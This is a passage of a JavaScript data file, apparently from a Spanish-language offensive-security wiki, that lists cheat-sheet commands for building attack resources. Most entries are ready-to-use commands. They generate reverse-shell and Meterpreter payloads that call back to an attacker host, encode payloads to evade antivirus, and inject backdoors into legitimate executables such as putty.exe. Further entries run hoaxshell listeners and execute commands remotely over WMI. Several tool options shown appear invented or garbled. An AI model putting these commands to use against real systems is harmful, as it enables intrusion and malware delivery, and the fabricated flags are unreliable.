// Desarrollo de Recursos (Resource Development)
window.WIKI_CHEATSHEETS_02_RESOURCE_DEV = [
 {
  "tool": "msfvenom",
  "desc": "Generador de payloads y encoders de Metasploit",
  "commands": [
   {
    "cmd": "msfvenom -l payloads",
    "desc": "Listar todos los payloads"
   },
   {
    "cmd": "msfvenom -l encoders",
    "desc": "Listar encoders"
   },
   {
    "cmd": "msfvenom -l formats",
    "desc": "Listar formatos de salida"
   },
   {
    "cmd": "msfvenom -l archs",
    "desc": "Listar arquitecturas"
   },
   {
    "cmd": "msfvenom -l platforms",
    "desc": "Listar plataformas"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe",
    "desc": "Meterpreter reverse TCP Windows x64"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o https.exe",
    "desc": "Meterpreter over HTTPS"
   },
   {
    "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf",
    "desc": "Meterpreter Linux x64"
   },
   {
    "cmd": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf",
    "desc": "Shell reverse TCP Linux"
   },
   {
    "cmd": "msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php",
    "desc": "Webshell PHP Meterpreter"
   },
   {
    "cmd": "msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php",
    "desc": "Reverse shell PHP"
   },
   {
    "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war",
    "desc": "JSP reverse shell en WAR"
   },
   {
    "cmd": "msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o apk.apk",
    "desc": "APK Android Meterpreter"
   },
   {
    "cmd": "msfvenom -p osx/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f macho -o shell.macho",
    "desc": "Reverse shell macOS"
   },
   {
    "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi",
    "desc": "Instalador MSI malicioso"
   },
   {
    "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f vba -o macro.vba",
    "desc": "Macro VBA de Office"
   },
   {
    "cmd": "msfvenom -p windows/x64/powershell_reverse_tcp LHOST=IP LPORT=4444 -f psh -o shell.ps1",
    "desc": "PowerShell reverse shell"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f python -o shell.py",
    "desc": "Payload en Python"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f c -o shell.c",
    "desc": "Payload en C"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.bin",
    "desc": "Shellcode raw"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor -i 5 -f exe -o encoded.exe",
    "desc": "Codificar con XOR 5 veces"
   },
   {
    "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe",
    "desc": "Shikata Ga Nai 10 iteraciones"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -b '\\x00\\x0a\\x0d' -f exe -o nobad.exe",
    "desc": "Evitar bad chars"
   },
   {
    "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -x /usr/share/windows-binaries/putty.exe -k -f exe -o putty-evil.exe",
    "desc": "Inyectar en ejecutable legítimo"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 --platform windows -a x64 --arch x64 -f exe",
    "desc": "Especificar plataforma y arquitectura"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe-template -o tmpl.exe",
    "desc": "Usar plantilla de exe"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=IP LPORT=4444 -f exe -o winhttps.exe",
    "desc": "Meterpreter WinHTTP"
   },
   {
    "cmd": "msfvenom -p windows/x64/shell/bind_tcp LPORT=4444 -f exe -o bind.exe",
    "desc": "Bind shell TCP"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_dns LHOST=objetivo.com LPORT=53 -f exe -o dns.exe",
    "desc": "Meterpreter over DNS"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f psh-cmd -o payload.cmd",
    "desc": "PSH CMD (bypass execution policy)"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o shell.hta",
    "desc": "HTA con PowerShell"
   },
   {
    "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vbs -o shell.vbs",
    "desc": "VBScript payload"
   },
   {
    "cmd": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c",
    "desc": "Shellcode C codificado"
   },
   {
    "cmd": "msfvenom --list nops",
    "desc": "Listar generadores NOP"
   }
  ]
 },
 {
  "tool": "msfpc",
  "desc": "MSFvenom Payload Creator - genera payloads con un solo comando",
  "commands": [
   {
    "cmd": "msfpc windows IP",
    "desc": "Payload Windows estándar"
   },
   {
    "cmd": "msfpc linux IP",
    "desc": "Payload Linux"
   },
   {
    "cmd": "msfpc mac IP",
    "desc": "Payload macOS"
   },
   {
    "cmd": "msfpc android IP",
    "desc": "Payload Android"
   },
   {
    "cmd": "msfpc php IP",
    "desc": "Payload PHP"
   },
   {
    "cmd": "msfpc python IP",
    "desc": "Payload Python"
   },
   {
    "cmd": "msfpc bash IP",
    "desc": "Payload Bash"
   },
   {
    "cmd": "msfpc java IP",
    "desc": "Payload Java WAR"
   },
   {
    "cmd": "msfpc perl IP",
    "desc": "Payload Perl"
   },
   {
    "cmd": "msfpc windows IP 443",
    "desc": "Con puerto específico"
   },
   {
    "cmd": "msfpc windows IP 443 http",
    "desc": "Tipo de conexión http"
   },
   {
    "cmd": "msfpc windows IP 443 https",
    "desc": "Tipo de conexión https"
   },
   {
    "cmd": "msfpc windows IP 4444 tcp -e x86/shikata_ga_nai",
    "desc": "Con encoder"
   },
   {
    "cmd": "msfpc -p msfvenom windows IP",
    "desc": "Solo generar comando msfvenom"
   }
  ]
 },
 {
  "tool": "donut",
  "desc": "Generar shellcode independiente de posición desde archivos PE/.NET",
  "commands": [
   {
    "cmd": "donut -f malicious.exe -o payload.bin",
    "desc": "Convertir exe a shellcode"
   },
   {
    "cmd": "donut -f malicious.exe -a x64 -o payload.bin",
    "desc": "Arquitectura x64"
   },
   {
    "cmd": "donut -f app.dll -o payload.bin",
    "desc": "Convertir DLL"
   },
   {
    "cmd": "donut -f malicious.exe -c \"args\" -o payload.bin",
    "desc": "Con argumentos"
   },
   {
    "cmd": "donut -f malicious.exe -p 'param' -o payload.bin",
    "desc": "Con parámetro"
   },
   {
    "cmd": "donut -f malicious.exe -e -o payload.bin",
    "desc": "Encriptar payload"
   },
   {
    "cmd": "donut -f malicious.exe -z 2 -o payload.bin",
    "desc": "Compresión nivel 2"
   },
   {
    "cmd": "donut -f malicious.exe -x 2 -o payload.bin",
    "desc": "Carga en etapa 2"
   },
   {
    "cmd": "donut -f malicious.exe -t -o payload.bin",
    "desc": "Modo texto"
   },
   {
    "cmd": "donut -f malicious.exe -v -o payload.bin",
    "desc": "Verbose"
   },
   {
    "cmd": "donut -f malicious.exe -d -o payload.bin",
    "desc": "Modo demo (test local)"
   },
   {
    "cmd": "donut -f malicious.exe -i 3 -o payload.bin",
    "desc": "Solicitud de instancia"
   },
   {
    "cmd": "donut -f malicious.exe -b 1 -o payload.bin",
    "desc": "Modo bypass"
   },
   {
    "cmd": "donut -f malicious.exe -r -o payload.bin",
    "desc": "Reportar exit code"
   }
  ]
 },
 {
  "tool": "sickle",
  "desc": "Generador de shellcode interactivo con análisis de bad chars",
  "commands": [
   {
    "cmd": "sickle -f shellcode.bin -o out.py",
    "desc": "Convertir shellcode a Python"
   },
   {
    "cmd": "sickle -f shellcode.bin -a",
    "desc": "Analizar bad characters"
   },
   {
    "cmd": "sickle -f shellcode.bin -d",
    "desc": "Desensamblar shellcode"
   },
   {
    "cmd": "sickle -f shellcode.bin -s",
    "desc": "Obtener tamaño"
   },
   {
    "cmd": "sickle -f shellcode.bin -c",
    "desc": "Comparar shellcodes"
   },
   {
    "cmd": "sickle -f shellcode.bin -x",
    "desc": "Extraer shellcode"
   },
   {
    "cmd": "sickle -i -f payload.bin -o out.c",
    "desc": "Formato C"
   },
   {
    "cmd": "sickle -i -f payload.bin -o out.rb",
    "desc": "Formato Ruby"
   },
   {
    "cmd": "sickle -f shellcode.bin --execute",
    "desc": "Ejecutar shellcode"
   },
   {
    "cmd": "sickle -f shellcode.bin --disasm arch",
    "desc": "Desensamblar con arch específica"
   }
  ]
 },
 {
  "tool": "searchsploit",
  "desc": "Buscador offline de exploits de Exploit-DB",
  "commands": [
   {
    "cmd": "searchsploit apache",
    "desc": "Buscar exploits de Apache"
   },
   {
    "cmd": "searchsploit wordpress",
    "desc": "Buscar exploits de WordPress"
   },
   {
    "cmd": "searchsploit -t 'linux kernel'",
    "desc": "Buscar por título"
   },
   {
    "cmd": "searchsploit 'remote code execution'",
    "desc": "Buscar por descripción"
   },
   {
    "cmd": "searchsploit -c apache",
    "desc": "Buscar en todo el contenido"
   },
   {
    "cmd": "searchsploit -m 45678",
    "desc": "Copiar exploit al directorio actual"
   },
   {
    "cmd": "searchsploit -x 45678",
    "desc": "Examinar exploit con paginador"
   },
   {
    "cmd": "searchsploit -p 45678",
    "desc": "Ruta completa del exploit"
   },
   {
    "cmd": "searchsploit --nmap nmap-output.xml",
    "desc": "Correlacionar con Nmap"
   },
   {
    "cmd": "searchsploit -e metasploit",
    "desc": "Buscar solo módulos Metasploit"
   },
   {
    "cmd": "searchsploit -w apache",
    "desc": "Mostrar URLs de Exploit-DB"
   },
   {
    "cmd": "searchsploit -j apache",
    "desc": "Salida JSON"
   },
   {
    "cmd": "searchsploit -u",
    "desc": "Actualizar base de datos"
   },
   {
    "cmd": "searchsploit linux 5.4",
    "desc": "Buscar por versión de kernel"
   },
   {
    "cmd": "searchsploit --id apache",
    "desc": "Mostrar IDs de los exploits"
   },
   {
    "cmd": "searchsploit -v apache",
    "desc": "Verbose"
   },
   {
    "cmd": "searchsploit -q apache",
    "desc": "Solo resultados exactos"
   },
   {
    "cmd": "searchsploit 'microsoft word 2019'",
    "desc": "Buscar específico de versión"
   },
   {
    "cmd": "searchsploit 'SMB EternalBlue'",
    "desc": "Buscar EternalBlue"
   },
   {
    "cmd": "searchsploit --colour apache",
    "desc": "Con colores"
   }
  ]
 },
 {
  "tool": "exploitdb",
  "desc": "Base de datos de exploits local (Exploit-DB)",
  "commands": [
   {
    "cmd": "searchsploit -u",
    "desc": "Actualizar la base de datos"
   },
   {
    "cmd": "exploitdb -p 45678",
    "desc": "Ver path del exploit"
   },
   {
    "cmd": "ls /usr/share/exploitdb/exploits/",
    "desc": "Explorar exploits por categoría"
   },
   {
    "cmd": "grep -r 'CVE-2021-41773' /usr/share/exploitdb/",
    "desc": "Buscar por CVE"
   },
   {
    "cmd": "ls /usr/share/exploitdb/shellcodes/",
    "desc": "Ver shellcodes"
   },
   {
    "cmd": "exploitdb-papers",
    "desc": "Documentación y papers"
   }
  ]
 },
 {
  "tool": "searchsploit-alt",
  "desc": "Buscar exploits alternativos de otros repositorios",
  "commands": [
   {
    "cmd": "searchsploit-alt apache",
    "desc": "Buscar en fuentes alternativas"
   },
   {
    "cmd": "searchsploit-alt -u wordpress",
    "desc": "Buscar por usuario"
   },
   {
    "cmd": "searchsploit-alt -t 'phpmyadmin'",
    "desc": "Buscar por título"
   },
   {
    "cmd": "searchsploit-alt -v apache",
    "desc": "Verbose"
   },
   {
    "cmd": "searchsploit-alt -o out.txt apache",
    "desc": "Guardar en archivo"
   }
  ]
 },
 {
  "tool": "veil",
  "desc": "Generador de payloads que evaden antivirus",
  "commands": [
   {
    "cmd": "veil",
    "desc": "Abrir menú interactivo"
   },
   {
    "cmd": "veil -l Evasion",
    "desc": "Listar opciones de Evasion"
   },
   {
    "cmd": "veil -t Evasion -p python/meterpreter/rev_tcp",
    "desc": "Generar payload Python"
   },
   {
    "cmd": "veil -t Evasion -p powershell/meterpreter/rev_tcp",
    "desc": "Payload PowerShell"
   },
   {
    "cmd": "veil -t Evasion -p c/meterpreter/rev_tcp",
    "desc": "Payload C"
   },
   {
    "cmd": "veil -t Evasion -p go/meterpreter/rev_tcp",
    "desc": "Payload Go"
   },
   {
    "cmd": "veil -t Evasion -p ruby/meterpreter/rev_tcp",
    "desc": "Payload Ruby"
   },
   {
    "cmd": "veil -t Evasion -p perl/meterpreter/rev_tcp",
    "desc": "Payload Perl"
   },
   {
    "cmd": "veil -t Evasion -p python/shellcode_inject/virtual",
    "desc": "Inyección virtual"
   },
   {
    "cmd": "veil -t Evasion -p c/shellcode_inject/self_halting_dual_mixed",
    "desc": "Inyección dual"
   },
   {
    "cmd": "veil -t Evasion --msfvenom-options",
    "desc": "Opciones de msfvenom"
   },
   {
    "cmd": "veil -t Ordinator -p",
    "desc": "Payloads con firma de Microsoft"
   },
   {
    "cmd": "veil -c config.yaml",
    "desc": "Usar archivo de configuración"
   },
   {
    "cmd": "veil -t Evasion -p python/meterpreter/rev_tcp LHOST=IP LPORT=4444",
    "desc": "Con LHOST y LPORT"
   }
  ]
 },
 {
  "tool": "shellter",
  "desc": "Inyector de payloads dinámicos en ejecutables Windows",
  "commands": [
   {
    "cmd": "shellter",
    "desc": "Modo interactivo"
   },
   {
    "cmd": "shellter -a -p payload.exe -e msf -l LHOST -r LPORT",
    "desc": "Auto-inyección con Metasploit"
   },
   {
    "cmd": "shellter -a -p putty.exe -e custom -f payload.bin",
    "desc": "Payload custom"
   },
   {
    "cmd": "shellter -a -p notepad.exe -e msf -l IP -r 4444 -s",
    "desc": "Silencioso"
   },
   {
    "cmd": "shellter --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "backdoor-factory",
  "desc": "Inyectar shellcodes en binarios PE legítimos",
  "commands": [
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline",
    "desc": "Inyectar reverse shell"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s iat_reverse_tcp_stager_threaded",
    "desc": "Stager con IAT"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_https_meterpreter",
    "desc": "Meterpreter HTTPS"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_tcp_stager_threaded",
    "desc": "Stager threaded"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s none -j",
    "desc": "Encontrar cave para inyección"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline -o backdoored.exe",
    "desc": "Con salida"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline -a x64",
    "desc": "Arquitectura x64"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline -S",
    "desc": "Usar SSL"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline -b 5",
    "desc": "Método de inyección 5 (venv)"
   },
   {
    "cmd": "backdoor-factory -f putty.exe -H IP -P 4444 -s reverse_shell_tcp_inline -c",
    "desc": "Comprobar cave"
   }
  ]
 },
 {
  "tool": "pyinstaller",
  "desc": "Empaquetar scripts Python en ejecutables autónomos",
  "commands": [
   {
    "cmd": "pyinstaller --onefile script.py",
    "desc": "Empaquetar en un solo archivo"
   },
   {
    "cmd": "pyinstaller --onefile --windowed script.py",
    "desc": "Sin consola (GUI)"
   },
   {
    "cmd": "pyinstaller --onefile --icon=icon.ico script.py",
    "desc": "Con icono"
   },
   {
    "cmd": "pyinstaller --onefile --name out script.py",
    "desc": "Nombre personalizado"
   },
   {
    "cmd": "pyinstaller --onefile --add-data 'data.txt:.' script.py",
    "desc": "Añadir datos"
   },
   {
    "cmd": "pyinstaller --onefile --hidden-import module script.py",
    "desc": "Import oculto"
   },
   {
    "cmd": "pyinstaller --onefile --key KEY script.py",
    "desc": "Cifrar bytecode"
   },
   {
    "cmd": "pyinstaller --onefile --noupx script.py",
    "desc": "Sin UPX"
   },
   {
    "cmd": "pyinstaller --onefile --clean script.py",
    "desc": "Limpiar cache"
   },
   {
    "cmd": "pyinstaller --onefile --noconfirm script.py",
    "desc": "Sobrescribir sin confirmar"
   },
   {
    "cmd": "pyinstaller --onefile --version-file ver.txt script.py",
    "desc": "Con versión"
   },
   {
    "cmd": "pyinstaller --onefile -p /path/libs script.py",
    "desc": "Rutas de imports"
   }
  ]
 },
 {
  "tool": "olevba",
  "desc": "Analizar macros VBA maliciosas en documentos Office",
  "commands": [
   {
    "cmd": "olevba -a documento.docm",
    "desc": "Analizar todas las macros"
   },
   {
    "cmd": "olevba --decode documento.docm",
    "desc": "Decodificar strings ofuscadas"
   },
   {
    "cmd": "olevba --reveal documento.docm",
    "desc": "Revelar macros ocultas"
   },
   {
    "cmd": "olevba --analysis documento.docm",
    "desc": "Análisis completo"
   },
   {
    "cmd": "olevba -c documento.xlsm",
    "desc": "Solo consola"
   },
   {
    "cmd": "olevba -j documento.docx",
    "desc": "Salida JSON"
   },
   {
    "cmd": "olevba -f documento.docm",
    "desc": "Extraer macros a archivos"
   },
   {
    "cmd": "olevba --deobfuscate documento.docm",
    "desc": "Deofuscar"
   },
   {
    "cmd": "olevba --indicators documento.docm",
    "desc": "Mostrar indicadores de malware"
   },
   {
    "cmd": "olevba -e documento.docm",
    "desc": "Extraer IOCs"
   },
   {
    "cmd": "olevba --xmldump documento.docm",
    "desc": "Volcar XML"
   },
   {
    "cmd": "olevba -p file.vba documento.docm",
    "desc": "Guardar VBA en archivo"
   },
   {
    "cmd": "olevba --regex 'pattern' documento.docm",
    "desc": "Buscar por regex"
   },
   {
    "cmd": "olevba -s 3 documento.docm",
    "desc": "Nivel de severidad 3"
   }
  ]
 },
 {
  "tool": "olefile",
  "desc": "Parsear archivos OLE2 (Office legacy) y extraer streams",
  "commands": [
   {
    "cmd": "olefile documento.doc",
    "desc": "Listar streams del OLE"
   },
   {
    "cmd": "olefile -s documento.doc",
    "desc": "Con información detallada de streams"
   },
   {
    "cmd": "olefile -l documento.xls",
    "desc": "Solo listado"
   },
   {
    "cmd": "olefile -d documento.doc",
    "desc": "Debug"
   },
   {
    "cmd": "olefile -e documento.doc",
    "desc": "Ver directorio"
   },
   {
    "cmd": "olefile --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "oletools",
  "desc": "Suite de herramientas para análisis de documentos Office",
  "commands": [
   {
    "cmd": "oleid documento.doc",
    "desc": "Identificar formato y macros"
   },
   {
    "cmd": "oleid -j documento.doc",
    "desc": "Salida JSON"
   },
   {
    "cmd": "olemeta documento.doc",
    "desc": "Mostrar metadatos"
   },
   {
    "cmd": "olevba --decode documento.doc",
    "desc": "Decodificar VBA"
   },
   {
    "cmd": "olemap documento.doc",
    "desc": "Mapa de streams"
   },
   {
    "cmd": "rtfobj documento.rtf",
    "desc": "Extraer objetos embebidos de RTF"
   },
   {
    "cmd": "rtfobj -s documento.rtf",
    "desc": "Con identificación"
   },
   {
    "cmd": "msoddeunpack documento.docx",
    "desc": "Detectar DDE"
   },
   {
    "cmd": "swf_identifier.swf",
    "desc": "Identificar SWF"
   },
   {
    "cmd": "oleobj documento.doc",
    "desc": "Extraer objetos OLE"
   },
   {
    "cmd": "python-oletools documento.doc",
    "desc": "Biblioteca Python"
   }
  ]
 },
 {
  "tool": "shellnoob",
  "desc": "Facilitar la escritura y ejecución de shellcode",
  "commands": [
   {
    "cmd": "shellnoob --convert hex2bin shellcode.txt",
    "desc": "Convertir hex a binario"
   },
   {
    "cmd": "shellnoob --convert bin2hex shellcode.bin",
    "desc": "Binario a hex"
   },
   {
    "cmd": "shellnoob --convert c2asm shellcode.c",
    "desc": "C a ensamblador"
   },
   {
    "cmd": "shellnoob --convert asm2bin shell.asm",
    "desc": "Ensamblador a binario"
   },
   {
    "cmd": "shellnoob --extract shellcode.bin",
    "desc": "Extraer shellcode"
   },
   {
    "cmd": "shellnoob --execute shellcode.bin",
    "desc": "Ejecutar shellcode"
   },
   {
    "cmd": "shellnoob --version",
    "desc": "Versión"
   },
   {
    "cmd": "shellnoob -t 32 shellcode.bin",
    "desc": "Arquitectura 32 bits"
   },
   {
    "cmd": "shellnoob -t 64 shellcode.bin",
    "desc": "Arquitectura 64 bits"
   }
  ]
 },
 {
  "tool": "msitools",
  "desc": "Herramientas para manipular instaladores MSI",
  "commands": [
   {
    "cmd": "msiinfo summary.msi info",
    "desc": "Información del MSI"
   },
   {
    "cmd": "msiinfo export.msi",
    "desc": "Exportar streams"
   },
   {
    "cmd": "msiextract install.msi",
    "desc": "Extraer contenido"
   },
   {
    "cmd": "msiextract -C dir install.msi",
    "desc": "Extraer a directorio"
   },
   {
    "cmd": "msiinfo tables install.msi",
    "desc": "Listar tablas"
   },
   {
    "cmd": "msiinfo queries install.msi",
    "desc": "Consultas SQL al MSI"
   },
   {
    "cmd": "wixl -o install.msi instalador.wxs",
    "desc": "Compilar WXS a MSI"
   },
   {
    "cmd": "wixl -x instalador.wxs",
    "desc": "Extract de MSI"
   },
   {
    "cmd": "msidump install.msi",
    "desc": "Volcar contenido"
   }
  ]
 },
 {
  "tool": "wmi",
  "desc": "Herramientas WMI (Windows Management Instrumentation) en Kali",
  "commands": [
   {
    "cmd": "wmis -u user -p pass //TARGET 'select * from Win32_Process'",
    "desc": "Consultar procesos remotos"
   },
   {
    "cmd": "wmis -u user -p pass //TARGET 'select * from Win32_OperatingSystem'",
    "desc": "Sistema operativo"
   },
   {
    "cmd": "wmis -u user -p pass //TARGET 'select * from Win32_NetworkAdapterConfiguration'",
    "desc": "Config de red"
   },
   {
    "cmd": "wmic -U user%pass //TARGET 'process list'",
    "desc": "Listar procesos vía WMI"
   },
   {
    "cmd": "wmis -u user -p pass //TARGET 'create cmd.exe'",
    "desc": "Ejecutar comando"
   },
   {
    "cmd": "wmic -U user%pass //TARGET 'process call create \"cmd.exe /c whoami\"'",
    "desc": "Ejecutar proceso"
   },
   {
    "cmd": "wmis -u user -p pass --namespace root\\cimv2 //TARGET query",
    "desc": "Namespace custom"
   }
  ]
 },
 {
  "tool": "exe2hexbat",
  "desc": "Convertir ejecutables a script BAT/PowerShell para transferencia",
  "commands": [
   {
    "cmd": "exe2hex -x payload.exe",
    "desc": "Convertir exe a BAT hex"
   },
   {
    "cmd": "exe2hex -x payload.exe -p",
    "desc": "Generar también PowerShell"
   },
   {
    "cmd": "exe2hex -x payload.exe -c",
    "desc": "Con comentarios"
   },
   {
    "cmd": "exe2hex -x payload.exe -b",
    "desc": "Con bit-slicing"
   },
   {
    "cmd": "exe2hex -x payload.exe -o payload.bat",
    "desc": "Archivo de salida"
   },
   {
    "cmd": "exe2hex -x payload.exe -e -o payload.ps1",
    "desc": "Solo PowerShell"
   },
   {
    "cmd": "exe2hex -x payload.exe -r",
    "desc": "Randomización de nombres"
   }
  ]
 },
 {
  "tool": "linux-exploit-suggester",
  "desc": "Sugerir exploits para kernel Linux según versión",
  "commands": [
   {
    "cmd": "linux-exploit-suggester.sh",
    "desc": "Ejecutar sugerencias de exploits"
   },
   {
    "cmd": "linux-exploit-suggester.sh --uname",
    "desc": "Con info del kernel"
   },
   {
    "cmd": "linux-exploit-suggester.sh -c",
    "desc": "Comprobar solo CVE conocidos"
   },
   {
    "cmd": "linux-exploit-suggester.sh -s",
    "desc": "Con exploit-db IDs"
   },
   {
    "cmd": "linux-exploit-suggester.sh -f",
    "desc": "Full output"
   },
   {
    "cmd": "linux-exploit-suggester.sh -d",
    "desc": "Solo distro"
   }
  ]
 },
 {
  "tool": "linux-exploit-suggester-2",
  "desc": "Segunda versión del sugeridor de exploits de kernel",
  "commands": [
   {
    "cmd": "linux-exploit-suggester-2.pl",
    "desc": "Ejecutar análisis"
   },
   {
    "cmd": "linux-exploit-suggester-2.pl -d",
    "desc": "Debug"
   },
   {
    "cmd": "linux-exploit-suggester-2.pl -k 4.4.0",
    "desc": "Versión de kernel específica"
   },
   {
    "cmd": "linux-exploit-suggester-2.pl -s",
    "desc": "Modo silencioso"
   },
   {
    "cmd": "linux-exploit-suggester-2.pl -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "set",
  "desc": "Social-Engineer Toolkit - framework de ingeniería social",
  "commands": [
   {
    "cmd": "setoolkit",
    "desc": "Abrir menú principal"
   },
   {
    "cmd": "setoolkit -h",
    "desc": "Ayuda"
   },
   {
    "cmd": "setoolkit --version",
    "desc": "Versión"
   }
  ]
 },
 {
  "tool": "armitage",
  "desc": "GUI de Metasploit con mapeo de red y gestión de sesiones",
  "commands": [
   {
    "cmd": "armitage",
    "desc": "Abrir GUI (requiere metasploit iniciado)"
   },
   {
    "cmd": "teamserver IP password",
    "desc": "Iniciar teamserver para multi-usuario"
   },
   {
    "cmd": "armitage --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "shellter-pro",
  "desc": "Versión pro del inyector de payloads",
  "commands": [
   {
    "cmd": "shellter --help",
    "desc": "Ayuda"
   },
   {
    "cmd": "shellter -h",
    "desc": "Ayuda corta"
   }
  ]
 },
 {
  "tool": "hoaxshell",
  "desc": "Webshell HTTP/HTTPS sigilosa con GUI de sesiones",
  "commands": [
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -i",
    "desc": "Modo interactivo"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -i -a",
    "desc": "Autostart browser"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -r",
    "desc": "Reverse powershell"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -b",
    "desc": "Con banner"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -u",
    "desc": "URL"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 443 -s",
    "desc": "HTTPS"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -g",
    "desc": "Generar payload"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -x 'whoami'",
    "desc": "Comando"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -t",
    "desc": "TTY"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -l",
    "desc": "Listener"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -k",
    "desc": "Keep alive"
   },
   {
    "cmd": "hoaxshell -s 10.0.0.1 -p 8080 -o /tmp/shell.ps1",
    "desc": "Guardar payload"
   },
   {
    "cmd": "hoaxshell -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "hyperion",
  "desc": "Cifrador de ejecutables PE (passthru technique)",
  "commands": [
   {
    "cmd": "hyperion crypter.exe out.exe",
    "desc": "Cifrar ejecutable"
   },
   {
    "cmd": "hyperion -x crypter.exe out.exe",
    "desc": "Modo xtreme"
   },
   {
    "cmd": "hyperion crypter.exe out.exe -k",
    "desc": "Con key"
   },
   {
    "cmd": "hyperion crypter.exe out.exe -o",
    "desc": "Overwrite"
   },
   {
    "cmd": "hyperion crypter.exe out.exe -v",
    "desc": "Verbose"
   },
   {
    "cmd": "hyperion -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "sgn",
  "desc": "Shikata Ga Nai encoder (shellcode encoder portable)",
  "commands": [
   {
    "cmd": "sgn -a 32 shellcode.bin",
    "desc": "Codificar x86"
   },
   {
    "cmd": "sgn -a 64 shellcode.bin",
    "desc": "Codificar x64"
   },
   {
    "cmd": "sgn -a 32 -o out.bin shellcode.bin",
    "desc": "Salida"
   },
   {
    "cmd": "sgn -a 32 -i 5 shellcode.bin",
    "desc": "5 iteraciones"
   },
   {
    "cmd": "sgn -a 32 -c shellcode.bin",
    "desc": "Con checksum"
   },
   {
    "cmd": "sgn -a 32 -h shellcode.bin",
    "desc": "Hexadecimal output"
   },
   {
    "cmd": "sgn -a 32 -s shellcode.bin",
    "desc": "Sin obfuscation"
   },
   {
    "cmd": "sgn -a 32 -v shellcode.bin",
    "desc": "Verbose"
   },
   {
    "cmd": "sgn -a 32 --no-safe shellcode.bin",
    "desc": "Sin safe mode"
   },
   {
    "cmd": "sgn -a 32 -f '\\x41\\x42' shellcode.bin",
    "desc": "Formato"
   },
   {
    "cmd": "sgn -a 32 -m",
    "desc": "Multi-arch"
   },
   {
    "cmd": "sgn -a 32 -d shellcode.bin",
    "desc": "Decodificar"
   },
   {
    "cmd": "sgn -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "oledump",
  "desc": "Analizar archivos OLE (malware en documentos)",
  "commands": [
   {
    "cmd": "oledump.py documento.doc",
    "desc": "Dump streams"
   },
   {
